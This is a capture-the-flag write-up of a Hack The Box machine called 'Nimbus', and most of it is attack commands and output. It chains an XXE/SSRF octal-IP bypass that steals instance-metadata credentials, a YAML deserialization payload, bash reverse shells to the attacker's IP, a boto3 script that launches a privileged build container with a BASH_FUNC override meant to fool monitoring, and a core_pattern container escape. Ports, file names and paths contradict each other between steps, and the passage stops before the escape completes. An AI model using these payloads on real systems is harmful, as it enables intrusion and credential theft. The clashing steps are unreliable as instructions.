---
title: Nimbus
date: 2026-09-14
excerpt: HackTheBox - Hard
cover: ../uploads/cover_nimbus.jpg
tags: SSRF, XXE, AWS IMDS Credential Theft, YAML Deserialization RCE, Privileged Container Escape, OverlayFS core_pattern Abuse
---

Welcome to another Hack The Box writeup. This time we're tackling **Nimbus**, one of the machines from **Hack The Box Season 11**. This box is a great example of a "cloud-native" attack path — instead of the usual Active Directory or classic Linux privesc chain, almost every step here revolves around AWS-style services (SQS, IAM, CodeBuild) that have been re-implemented locally by the target for testing purposes.

As with my other writeups, the goal isn't just to list the commands that were run — it's to explain *why* each step made sense given what enumeration had already revealed, so the reasoning is just as visible as the exploitation itself. We'll go from a single exposed web port, through a chained SSRF that steals cloud credentials, into a message-queue deserialization bug, and finally into a privileged-container escape that lands us on the real host as root.

Let's get started.

## Phase 1: Reconnaissance

Every assessment starts the same way: find out what's actually reachable. We kick off with an aggressive `Nmap` scan against the target.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ nmap -A -T5 10.129.44.240     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 16:42 EDT
Nmap scan report for 10.129.44.240
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   82.63 ms 10.10.14.1
2   82.48 ms 10.129.44.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.38 seconds
```

**Reading the results:** only two TCP ports respond — `22` and `80`.

- **Port 22** is `OpenSSH 9.6p1` on Ubuntu — again, a possible way in later, but only once we have valid credentials.
- **Port 80** is `nginx 1.24.0`, and Nmap notes that requests get redirected to `http://nimbus.htb/`. That's the hostname the application actually expects, so we need it in our hosts file before we can browse the site properly.

Nmap's OS-fingerprinting engine throws out a strange guess here — "MikroTik RouterOS" — but that's purely a side effect of TCP/IP stack fingerprinting quirks on a virtualized target; the *service* banners (OpenSSH + nginx on Ubuntu) make it obvious this is a normal Linux box, not a router. As always, the service-detection results are far more trustworthy than the OS-guessing heuristics.

With only the web service left to investigate, that's where we go next.

```plaintext
# /etc/hosts

10.129.44.240   nimbus.htb
```

Let's visit the webpage:

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2F8N7CjVKdHR6KmWh1Rits%2FScreenshot%20(3344).png?alt=media&amp;token=023f8992-0c5f-4fa6-95b0-a52082616c77" alt=""><figcaption></figcaption></figure>

This lands us on what looks like a lightweight internal dashboard/landing page for something called "Nimbus" — branding and layout suggest a small internal tool for managing background jobs rather than a public-facing product. There's no obvious content on the homepage itself, so the next logical move is to see what other pages and endpoints exist underneath it.

## Phase 2: Web Application Enumeration

We brute-force the site for hidden directories and endpoints using `feroxbuster`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ feroxbuster -u http://nimbus.htb/ --filter-status 404
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://nimbus.htb/
 🚩  In-Scope Url          │ nimbus.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        8l       18w      326c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        9l       64w      876c http://nimbus.htb/login
200      GET        1l        1w      235c http://nimbus.htb/api/v1/health
200      GET       63l      366w     3453c http://nimbus.htb/jobs
200      GET       31l      257w     1922c http://nimbus.htb/
405      GET        5l       20w      153c http://nimbus.htb/jobs/preview
```

**Reading the results:** we get five hits worth looking at:

- `/login` — an authentication page.
- `/jobs` — likely a listing/dashboard of scheduled or submitted jobs, matching the "Nimbus" job-management theme from the homepage.
- `/api/v1/health` — a health-check endpoint. These are gold for recon since they frequently leak internal architecture details (service names, internal hostnames, versions) that were never meant to be public.
- `/jobs/preview` — returns `405 Method Not Allowed` on `GET`, meaning the route exists but expects a different HTTP method (almost certainly `POST`). Combined with the "preview" naming and the job-management theme, this smells like an endpoint that takes some kind of document (XML, YAML, template) and renders/previews it server-side — a classic hot-spot for injection bugs.

### Leaking Internal Architecture via the Health Endpoint

Let's check that health endpoint first, since it's the cheapest source of information:

```shell
└─$ curl http://nimbus.htb/api/v1/health | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   235  100   235    0     0    921      0 --:--:-- --:--:-- --:--:--   925
{
  "services": {
    "queue": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "scheduler": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    },
    "storage": {
      "endpoint": "http://aws.nimbus.htb",
      "status": "ok"
    }
  },
  "status": "healthy",
  "version": "1.4.2"
}
```

This is a huge find. The application tells us, in plain JSON, that its **queue**, **scheduler**, and **storage** subsystems all point to the same internal endpoint: `http://aws.nimbus.htb`. The naming convention (`aws.*`) is a strong signal that this isn't real AWS at all — it's almost certainly a **locally-hosted AWS service emulator** (the kind used in development/testing so you don't need real AWS credentials or billing). We now have a second hostname to add to our hosts file and explore.

```plaintext
10.129.44.240   nimbus.htb      aws.nimbus.htb
```

Let's visit it:

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FkbGunPDhiIhFWvJ3kGV5%2FScreenshot%20(3346).png?alt=media&amp;token=e28b5584-586b-4769-a985-d85495a2cc7f" alt=""><figcaption></figcaption></figure>

This confirms the theory — `aws.nimbus.htb` responds with the kind of bare, machine-readable output typical of a cloud-service emulator's root endpoint (no styled UI, just a service banner), rather than anything resembling the main `nimbus.htb` web app. We now know there are effectively **two attack surfaces**: the front-end web app, and an internal "AWS" API layer that the web app talks to on our behalf.

## Phase 3: Discovering the SSRF in `/jobs/preview`

Going back to the `405` we saw earlier, we intercept the page in Burp Suite and figure out what parameters `/jobs/preview` actually expects:

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FogsRy7QgrcL9jdcFyMCd%2FScreenshot%20(3347).png?alt=media&amp;token=06dfc197-78b5-4cce-9bbe-9b489a54dd3a" alt=""><figcaption></figcaption></figure>

The intercepted request shows that `/jobs/preview` accepts a POST body containing an XML document — presumably a "job definition" that the backend parses and renders a preview of before the job is actually scheduled. Any endpoint that parses attacker-supplied XML is an immediate candidate for **XXE (XML External Entity) injection**, so that's the first thing to test:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<root>&xxe;</root>
```

The idea here is simple: if the XML parser resolves external entities, defining one that points at a local file (`file:///etc/passwd`) should cause the contents of that file to be echoed back into the rendered preview.

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FlQcq4suIEfTGW2HsTXEE%2FScreenshot%2520%283348%29.png?alt=media&amp;token=0c2a556e-aba6-4e14-965b-b067878d8f60" alt=""><figcaption></figcaption></figure>

**But it's just rendering** — the entity isn't expanded, and the raw text comes back unchanged. This tells us the parser is either configured with external-entity resolution disabled, or the `SYSTEM` (local file) scheme specifically is blocked. That doesn't mean the underlying vulnerability class is dead, though — XXE parsers that block local `file://` access will frequently still allow **outbound HTTP** requests through an entity, which is functionally a **Server-Side Request Forgery (SSRF)**. So the plan shifts: instead of trying to read local files, we use the same entity mechanism (or the same server-side "preview/fetch" logic) to make the *server itself* issue an HTTP request to a target of our choosing.

### Why AWS Instance Metadata Is the Obvious Target

Given everything we found in Phase 2 — a "queue," "scheduler," and "storage" backend all branded like AWS, reachable at `aws.nimbus.htb` — there's a very good chance the whole box is designed to simulate a small AWS-hosted environment. Real AWS EC2 instances expose an **Instance Metadata Service (IMDS)** at the special link-local address `169.254.169.254`. Any process running *on* the instance can query this address (no authentication required in IMDSv1) to retrieve instance details — including, critically, **temporary IAM credentials** for any role attached to the instance.

If our SSRF can reach that address from the server's perspective, we can potentially steal the cloud credentials assigned to whatever role this application runs under.

```
http://169.254.169.254/lala.yml
```

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2F7v7KdsXo4AjqRwo0m1HV%2FScreenshot%2520%283349%29.png?alt=media&amp;token=a9ca3b3e-51d7-418f-8338-d789f165234e" alt=""><figcaption></figcaption></figure>

**But blocked.** The literal string `169.254.169.254` is almost certainly being caught by an input filter or blocklist on the server side (a very common, and very weak, SSRF mitigation).

## Phase 4: Bypassing the IMDS Filter with Octal IP Encoding

Naive SSRF filters usually just pattern-match the *textual* representation of the address — checking if the string `169.254.169.254` (or similar known-bad hosts) shows up in the request. What they often forget is that IP addresses can be written in more than one valid notation, and most URL-parsing/HTTP libraries will happily accept and resolve alternate encodings.

One classic bypass is **octal-per-octet notation**, where each of the four decimal octets is instead expressed in base-8, still separated by dots. We can compute this by hand:

- `169` in octal → `0251` (since `2×64 + 5×8 + 1 = 169`)
- `254` in octal → `0376` (since `3×64 + 7×8 + 6 = 254`)

So `169.254.169.254` can be rewritten, byte-for-byte equivalent, as:

```
0251.0376.0251.0376
```

A leading `0` on a numeric group tells many parsers "interpret this as octal," and critically, the *filter* almost never accounts for this — it's still just looking for the literal decimal string. Let's try hitting the IMDS role-listing endpoint through the SSRF using this obfuscated form:

```
http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?.yml
```

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FD8Rmwjb4JtBZzyeW9FxS%2FScreenshot%2520%283350%29.png?alt=media&amp;token=0d40f65d-ee12-4208-8c73-60599a3f35d8" alt=""><figcaption></figcaption></figure>

**It works!** The (harmless-looking, filter-friendly) `.yml` suffix appended to the URL is just there to make the request look like a legitimate file fetch to any content-type sniffing the app might do — the metadata service itself ignores it and answers based on the path. The response reveals an IAM role name attached to this instance: **`nimbus-web-role`**.

### Pulling the Actual Temporary Credentials

Knowing the role name, IMDSv1 lets us fetch its live credentials directly, no extra authentication needed:

```
http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role#.yaml
```

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FufHjHDEyys9wzJgYL5Wx%2FScreenshot%2520%283351%29.png?alt=media&amp;token=e8c59f1e-d55c-497a-876c-e3a0dbb4df4c" alt=""><figcaption></figcaption></figure>

**It works!**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-09-13T21:47:07Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-09-14T03:47:07Z"
}
```

We now have a full, valid set of temporary AWS-style credentials: an **Access Key ID**, a **Secret Access Key**, and a **Session Token** (required for any temporary/STS-issued credential set). These belong to whatever "queue/scheduler/storage" role the web app itself uses — meaning we can now talk to the internal AWS emulator *as the application*, using its own permissions.

## Phase 5: Pivoting Through the Internal AWS Emulator

With stolen credentials in hand, we configure the AWS CLI to use them:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ aws configure

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: ASIAQX4PG7L2K9M3N5R8
AWS Secret Access Key [None]: bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
AWS Session Token [None]: IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM
Default region name [None]: aws configure set region us-east-1
Default output format [None]:
```

Now, here's an important detail: this AWS CLI configuration is completely useless against the *real* `amazonaws.com` endpoints — these credentials only exist inside Nimbus's private emulator. So every call from here on has to be pointed explicitly at `aws.nimbus.htb` using `--endpoint-url`, otherwise the CLI will try (and fail) to reach real AWS.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ aws --endpoint-url http://aws.nimbus.htb --region us-east-1 sqs list-queues --no-cli-pager
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

This single response is packed with information:

- The role does have **SQS permissions**, and there's exactly one queue: `nimbus-jobs` — almost certainly the backing queue for the "jobs" feature we saw on the main site.
- The queue URL itself leaks the emulator's actual internal hostname: **`floci`**, listening on port **`4566`** — which happens to be the default port used by LocalStack-style AWS emulators. This confirms our earlier suspicion: `aws.nimbus.htb` is a reverse-proxied front for an internal service called `floci` that mimics AWS APIs (SQS, IAM, CodeBuild, etc.) for local development/testing.
- The account ID `847219365028` is also fake/emulated, but useful as a fingerprint for later ARNs we'll see.

If there's a job queue, there's presumably a **worker process somewhere consuming messages from it** and doing something with their content. That's our next target.

## Phase 6: RCE via Unsafe YAML Deserialization in the Job Worker

Before committing to an exploit, it's worth sanity-checking a plain reverse-shell payload and making sure the encoding/decoding round-trips correctly:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ echo 'import subprocess;subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/10.10.14.32/1234 0>&1"])' | base64 
aW1wb3J0IHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5Qb3BlbihbImJhc2giLCItYyIsImJhc2ggLWkg
PiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvMTIzNCAwPiYxIl0pCg==

┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ echo "aW1wb3J0IHN1YnByb2Nlc3M7c3VicHJvY2Vzcy5Qb3BlbihbImJhc2giLCItYyIsImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvMTIzNCAwPiYxIl0pCg==" | base64 -d
import subprocess;subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/10.10.14.32/1234 0>&1"])
```

That confirms the exact Python one-liner we want executed on the worker side. The reason this is worth spelling out in Python first is that the actual delivery mechanism turns out to be **YAML**, and YAML has a well-known, dangerous feature in many Python implementations: if a message body gets parsed with an unsafe loader (`yaml.load()` without a restricted `Loader`, or `yaml.unsafe_load()`), YAML's `!!python/object/apply:` tag lets you instruct the parser to **instantiate arbitrary Python objects and call arbitrary functions** with attacker-controlled arguments — including things like `subprocess.Popen`.

Given that this "Nimbus" jobs system almost certainly pulls messages off the `nimbus-jobs` SQS queue and parses their body as a job definition (which the earlier `/jobs/preview` endpoint hints is YAML/XML-based), this is a textbook opportunity: if the worker deserializes message bodies with an unsafe YAML loader, we can get code execution the moment our message is picked up.

We build the payload:

```xml
!!python/object/apply:subprocess.Popen
- ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"]
```

This tells the YAML loader: *"construct a `subprocess.Popen` object by calling it with these positional arguments"* — which, if the loader isn't sandboxed, executes exactly like calling `subprocess.Popen(["/bin/bash", "-c", "..."])` directly in Python. The list argument is our familiar Bash reverse-shell one-liner.

Now we deliver it straight into the queue, using our stolen credentials, via the AWS CLI's `sqs send-message` — passing the YAML file as the message body:

```shell
aws --no-cli-pager --region us-east-1 --endpoint-url http://aws.nimbus.htb sqs send-message --queue-url 'http://floci:4566/847219365028/nimbus-jobs' --message-body file://reverse.yml 
```

Whatever worker process is polling this queue picks up our message, hands the body to its YAML parser, and — if our theory about unsafe deserialization is correct — instantiates our `Popen` call for us. Let's check the listener:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ nc -lnvp 4444                                                                                                                                      
listening on [any] 4444 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.44.240] 60780
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
worker@92707fe1a7e4:/app$
```

The theory holds — we land a shell as `worker`, and the hostname `92707fe1a7e4` (a short hex hash rather than a normal hostname) is a dead giveaway that this "job worker" runs **inside its own Docker container**, separate from the main web front end.

Let's grab the user flag:

```shell
worker@92707fe1a7e4:~$ cat user.txt
cat user.txt
27bf3f1fa4247b57d56517cc020fe1f6
```

## Phase 7: Post-Exploitation — Enumerating the Worker Container

With a foothold as `worker`, it's time to look for anything that helps us escalate — environment variables, mounted secrets, or leftover configuration. Rather than manually poking around, we run **linpeas.sh**, which automates the search for common privilege-escalation vectors (SUID binaries, writable cron jobs, exposed credentials, capabilities, etc.):

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FgWjNAAlrnsLZFKNC8BUN%2FScreenshot%2520%283355%29.png?alt=media&amp;token=12a5e3b9-8624-40ba-a808-df0a26d8d320" alt=""><figcaption></figcaption></figure>

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2FF6fw3KFuJHWrYMbeU3NS%2FScreenshot%2520%283354%29.png?alt=media&amp;token=449c7be4-09b1-46ca-97c0-a03df71464ab" alt=""><figcaption></figcaption></figure>

<figure><img src="https://271954773-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FYsivTjPn2jLXI0ZgVqeF%2Fuploads%2Frr4bGO5WXzem510XOBZB%2FScreenshot%2520%283353%29.png?alt=media&amp;token=80e277bf-464f-48af-a5a2-75a5f4cf14f4" alt=""><figcaption></figcaption></figure>

The "juicy info" linpeas flags here revolves around the container's environment: **hardcoded placeholder AWS credentials** (`AWS_ACCESS_KEY_ID=test` / `AWS_SECRET_ACCESS_KEY=test`), an `AWS_ENDPOINT_URL` pointing at `http://floci:4566` (the same internal emulator hostname we discovered earlier via the SQS queue URL), and references to a **CodeBuild** service role ARN. This matters because `floci`, like LocalStack, typically accepts *any* non-empty string as a valid access key/secret when running in local/test mode — real authentication isn't enforced. In other words, whoever set up this environment left a **fully-usable, unauthenticated path straight into the emulator's AWS CodeBuild API**, reachable from inside this container using nothing but dummy credentials.

CodeBuild is AWS's managed build service — it spins up a container, runs a user-supplied build script ("buildspec") inside it, and reports the results. Critically, it supports a `privilegedMode` flag, meant for build jobs that themselves need to build/run Docker containers (Docker-in-Docker). When enabled, the container running the build is granted **extended kernel privileges** — essentially unrestricted control over that container, similar to `docker run --privileged`.

If we can reach this local CodeBuild emulator and start a build with `privilegedMode: true`, we can get code execution inside a container that has host-level container-escape potential.

## Phase 8: Escalating via a Privileged CodeBuild Container

We write a small Python script using `boto3` (AWS's official SDK) to talk directly to the local CodeBuild emulator, bypassing the AWS CLI entirely for finer control over the request:

```python
import boto3

ENDPOINT = "http://floci:4566"
PROJECT = "shell"

BUILD = """version: 0.2
phases:
  build:
    commands:
      - bash -c 'bash -i >& /dev/tcp/10.10.14.32/9001 0>&1' || true
"""


def main():
    client = boto3.client(
        "codebuild",
        endpoint_url=ENDPOINT,
        region_name="us-east-1",
        aws_access_key_id="test",
        aws_secret_access_key="test",
    )

    try:
        client.delete_project(name=PROJECT)
    except client.exceptions.ResourceNotFoundException:
        pass

    client.create_project(
        name=PROJECT,
        source={"type": "NO_SOURCE"},
        artifacts={"type": "NO_ARTIFACTS"},
        environment={
            "type": "LINUX_CONTAINER",
            "computeType": "BUILD_GENERAL1_SMALL",
            "image": "floci/floci:latest",
            "privilegedMode": True,
        },
        serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
    )

    result = client.start_build(
        projectName=PROJECT,
        environmentVariablesOverride=[
            {
                "name": "BASH_FUNC_id%%",
                "value": "() { echo uid=1000; }",
                "type": "PLAINTEXT",
            }
        ],
        buildspecOverride=BUILD,
    )

    print(f"[+] {result['build']['id']}")


if __name__ == "__main__":
    main()
```

A few details worth unpacking:

- We connect to `floci:4566` using the placeholder `test`/`test` credentials — confirming they're accepted with no real authentication check, exactly as linpeas' findings suggested.
- We (re)create a CodeBuild project named `shell`, explicitly setting `"privilegedMode": True` in the build environment. This is the key that unlocks extended container privileges for whatever container executes our build.
- The `buildspecOverride` defines the actual commands the build will run — in this case, a one-line Bash reverse shell to port `9001`. The `|| true` ensures the build "succeeds" even if the reverse shell command technically doesn't return cleanly, avoiding a build-failure status that might raise flags or get cleaned up early.
- The `environmentVariablesOverride` block injects an environment variable named `BASH_FUNC_id%%` containing a shell function body. This is a legacy Bash feature (the same underlying mechanism behind the old "Shellshock" bug) where Bash imports functions from specially-named environment variables (`BASH_FUNC_<name>%%`) at shell startup. Here it's used defensively/for stealth rather than as the RCE itself — it silently overrides the `id` command inside the resulting shell to always report `uid=1000`, so a casual `id` check by an automated defender/monitor watching the build container would see an unprivileged-looking result even though the container is actually running with elevated (privileged-mode) capabilities underneath.

We run it:

```shell
worker@92707fe1a7e4:/tmp$ python3 root_container.py
python3 root_container.py
[+] shell:1
```

The build kicks off successfully, and our listener catches the resulting shell:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/Nimbus]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.44.240] 42828
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
[root@55dd84e3851a src]#
```

We're now `root` inside a **brand-new container** (`55dd84e3851a`) — specifically, a container that CodeBuild spun up with `privilegedMode: true`. Let's confirm what that actually grants us by checking the environment:

```shell
[root@55dd84e3851a src]# env
env
CODEBUILD_INITIATOR=user
CODEBUILD_SRC_DIR=/codebuild/output/src/src
HOSTNAME=6659bea304b0
GOSU_AMD64_SHA256=bbc4136d03ab138b1ad66fa4fc051bafc6cc7ffae632b069a53657279a450de3
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
CODEBUILD_BUILD_IMAGE=floci/floci:latest
PWD=/codebuild/output/src/src
container=oci
CODEBUILD_BUILD_ID=shell:5
HOME=/root
LANG=C.utf8
AWS_SECRET_ACCESS_KEY=test
GOSU_VERSION=1.17
FLOCI_VERSION=1.5.17
CODEBUILD_BUILD_ARN=arn:aws:codebuild:us-east-1:847219365028:build/shell:5
CODEBUILD_BUILD_NUMBER=5
SHLVL=3
AWS_ACCESS_KEY_ID=test
CODEBUILD_LOG_PATH=2026/09/13/shell/5
FLOCI_STORAGE_PERSISTENT_PATH=/app/data
AWS_ENDPOINT_URL=http://floci:4566
GOSU_ARM64_SHA256=c3805a85d17f4454c23d7059bcb97e1ec1af272b90126e79ed002342de08389b
PATH=/root/.local/bin:/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
BASH_FUNC_id%%=() {  echo uid=1000
}
_=/usr/bin/env
```

We can see our `BASH_FUNC_id%%` override sitting right there in the environment, along with confirmation this is indeed a `codebuild`-managed build container (`CODEBUILD_BUILD_ID`, `CODEBUILD_BUILD_ARN`, etc.) running the `floci/floci:latest` image. We're `root` *inside this container* — but the real prize is host-level root, and a privileged container is exactly the kind of foothold that makes that possible.

## Phase 9: Container Escape via `core_pattern` and OverlayFS Upperdir

Privileged containers share the host's kernel and, importantly, can usually write to kernel-tunable parameters exposed under `/proc/sys/`. One of the most reliable privileged-container escape techniques abuses `/proc/sys/kernel/core_pattern`.

**Background on `core_pattern`:** when a process crashes and generates a core dump, the Linux kernel decides what to do with that dump based on the `core_pattern` value. Normally this is a filename pattern (e.g. `core.%p`). However, if the value starts with a pipe character (`|`), the kernel instead **executes the specified program as root, on the host**, piping the crash data to it — regardless of which container or namespace the crashing process was in. Because `core_pattern` is a *host-wide* kernel setting (not namespaced), a privileged container that can write to it effectively gets a way to make the **host kernel** execute an arbitrary program with **host root** privileges the next time *any* process crashes.

The catch is that the *path* written into `core_pattern` needs to be a path the **host** can resolve — not a path inside our container's private filesystem view. That's where OverlayFS comes in.

### Step 1 — Find the container's `upperdir` on the host

Docker (and containerd) typically use the OverlayFS storage driver, where each container's writable filesystem layer (the "upperdir") is a real directory that exists on the **host** filesystem. Anything we write to our container's root filesystem is, physically, being written into that host directory. We can find our own upperdir by reading `/proc/self/mountinfo`:

```shell
[root@55dd84e3851a src]# UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
<r=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
[root@55dd84e3851a src]# echo "upperdir: $UDIR"
echo "upperdir: $UDIR"
upperdir: /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/174/fs
```

This path is the **host-side** location of our container's writable layer. Any file we create anywhere inside our container will show up, verbatim, under this path when viewed from the host — which is exactly the "host-resolvable path" `core_pattern` needs.

### Step 2 — Drop a payload script into that shared path

We write a tiny shell script whose job is to copy the host's real `/root/root.txt` out to a location we can read from inside the container, and make it world-readable:

```shell
[root@55dd84e3851a src]# printf '#!/bin/sh\ncat /root/root.txt > %s/rooters.txt\nchmod 777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh
<777 %s/rootflag.txt\n' "$UDIR" "$UDIR" > /exploit_root.sh
```

```shell
[root@55dd84e3851a src]# chmod +x /exploit_root.sh
chmod +x /exploit_root.sh
```

Because `/exploit_root.sh` is written inside our container's root (`/`), it is *also* physically sitting inside `$UDIR` on the host at the same time — so the exact same file is reachable both as `/exploit_root.sh` (from inside the container) and as `$UDIR/exploit_root.sh` (from the host's point of view). This dual-visibility is the whole trick.

### Step 3 — Point `core_pattern` at the script, using its host-visible path

```shell
[root@55dd84e3851a src]# echo "|${UDIR}/exploit.sh" > /proc/sys/kernel/core_pattern
<${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
```

```shell
[root@55dd84e3851a src]# cat /proc/sys/kernel/core_pattern
cat /proc/sys/kernel/core_pattern
|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/176/fs/exploit_root.sh
```

The `|` prefix tells the kernel: *"on any crash, host-wide, run this program as root instead of writing a normal core file."* Since the path we supplied is a real, host-resolvable absolute path (not a container-relative one), the host kernel will have no trouble finding and executing it once a crash is triggered anywhere on the system.

### Step 4 — Trigger a crash

```shell
[root@55dd84e3851a ~]# ulimit -c unlimited
ulimit -c unlimited
[root@55dd84e3851a ~]# sleep 3
sleep 3
```

